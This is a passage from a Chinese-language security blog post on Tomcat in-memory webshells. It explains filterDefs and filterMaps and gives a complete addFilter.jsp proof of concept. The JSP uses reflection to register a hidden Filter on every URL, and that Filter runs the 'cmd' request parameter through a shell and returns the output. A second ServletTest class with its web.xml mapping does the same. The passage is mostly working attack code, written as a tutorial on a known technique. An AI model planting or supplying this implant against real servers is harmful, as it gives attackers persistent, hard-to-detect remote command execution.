autohotkey">filterDefs`是一个HashMap，以键值对的形式存储`filterDef<br></code></pre></td></tr></table></figure><p><strong>filterMaps:包含所有过滤器的URL映射关系</strong> </p><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><h3 id="1-3-攻击思路："><a href="#1-3-攻击思路：" class="headerlink" title="1.3 攻击思路："></a>1.3 攻击思路：</h3><p>只需要构造含有恶意的 filter 的 <strong>filterConfig</strong> 和拦截器 <strong>filterMaps</strong>，就可以触发，而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.src.tomcatdemo.FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么只要可以更改web.xml 的filter-mapping 标签，就可以攻击成功了</p><p>找到 FilterMaps 通过下面的俩个方法进行添加数据</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513037.png" alt="img"></p><p>其中的 <strong>filterConfig</strong> 可以通过 filterConfigs.put(name, filterConfig); 添加</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513116.png" alt="img"></p><p><strong>动态添加恶意Filter的思路</strong></p><ol><li>获取StandardContext对象</li></ol><p>这一步和 servlet 的获取 StandardContext 对象一致：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><ol><li>创建恶意Filter</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>            n.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>使用FilterDef对Filter进行封装，并添加必要的属性</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>   <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>   filterDef.setFilter(filter);<br>   filterDef.setFilterName(name);<br>   filterDef.setFilterClass(filter.getClass().getName());<br>   context.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><ol><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    context.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><ol><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContextField.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(context);<br><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context, filterDef);<br>    filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><h4 id="完整-POC：addFilter-jsp"><a href="#完整-POC：addFilter-jsp" class="headerlink" title="完整 POC：addFilter.jsp"></a>完整 POC：addFilter.jsp</h4><p><strong>（一定要注意包不能导错！）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2</span><br>  Time: <span class="hljs-number">13</span>:<span class="hljs-number">42</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-comment">//有回显的 JSP</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>            <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                resp.getWriter().write(output);<br>                resp.getWriter().flush();<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// 1.获取 StandardContext 对象</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">StandardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-type">ShellFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellFilter</span>();<br><br>    <span class="hljs-comment">// 3. 使用 FilterDef 封装 filter</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    StandardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// 2. 创建 filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    StandardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 4.封装 filterConfig 和 filterDef 到 filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> StandardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(StandardContext);<br><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(StandardContext, filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="1-4-利用："><a href="#1-4-利用：" class="headerlink" title="1.4 利用："></a>1.4 利用：</h3><p>先访问 addFilter.jsp 写入内存马：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513974.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513215.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514479.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515244.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515248.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533673.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533352.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533532.png" alt="img"></p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>替换注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;servlet&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.src.tomcatdemo.HelloServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/hello-servlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><h4 id="先写一个恶意类测试："><a href="#先写一个恶意类测试：" class="headerlink" title="先写一个恶意类测试："></a>先写一个恶意类测试：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">// 基础恶意类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>web.xml 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515231.png" alt="img"></p><h2 id="2-Servlet-内存马"><a href="#2-Servlet-内存马" class="headerlink" 